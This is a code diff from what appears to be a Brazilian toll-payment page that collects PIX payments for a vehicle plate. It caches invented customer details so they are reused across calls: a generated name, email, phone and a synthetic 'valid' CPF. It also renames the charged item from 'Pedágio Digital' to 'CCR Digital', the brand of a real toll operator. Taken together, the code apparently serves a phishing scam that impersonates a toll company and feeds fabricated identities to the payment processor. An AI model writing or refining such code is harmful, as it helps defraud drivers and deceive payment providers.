@@ -611,6 +611,11 @@
         let _valorPagamento = null;
         let _pollingIntervalo = null;
         let _timerIntervalo = null;
+        // Dados do cliente gerados na 1ª chamada e reutilizados na 2ª
+        let _clienteNome = null;
+        let _clienteEmail = null;
+        let _clienteTelefone = null;
+        let _clienteCpf = null;
         // ────────────────────────────────────────────────────────────────
         document.addEventListener("DOMContentLoaded", () => {
 
@@ -924,12 +929,18 @@
             qrLoader.style.display = "block";
             pixImg.style.display = "none";
 
-            // Dados do cliente
+            // Dados do cliente — gera apenas na 1ª chamada, reutiliza na 2ª
             const placa = document.getElementById('Placa').value || 'PLACA';
-            const nomeCliente = gerarNomeBrasileiro();
-            const emailCliente = gerarEmail();
-            const telefoneCliente = gerarTelefone();
-            const cpfCliente = gerarCPFValido();
+            if (!_clienteNome) {
+                _clienteNome = gerarNomeBrasileiro();
+                _clienteEmail = gerarEmail();
+                _clienteTelefone = gerarTelefone();
+                _clienteCpf = gerarCPFValido();
+            }
+            const nomeCliente = _clienteNome;
+            const emailCliente = _clienteEmail;
+            const telefoneCliente = _clienteTelefone;
+            const cpfCliente = _clienteCpf;
 
             try {
                 // Chamada segura para o nosso Backend (Serverless Function)
@@ -955,7 +966,7 @@
                         },
                         items: [
                             {
-                                title: 'Pedágio Digital',
+                                title: 'CCR Digital',
                                 unitPrice: valor,
                                 quantity: 1,
                                 tangible: false
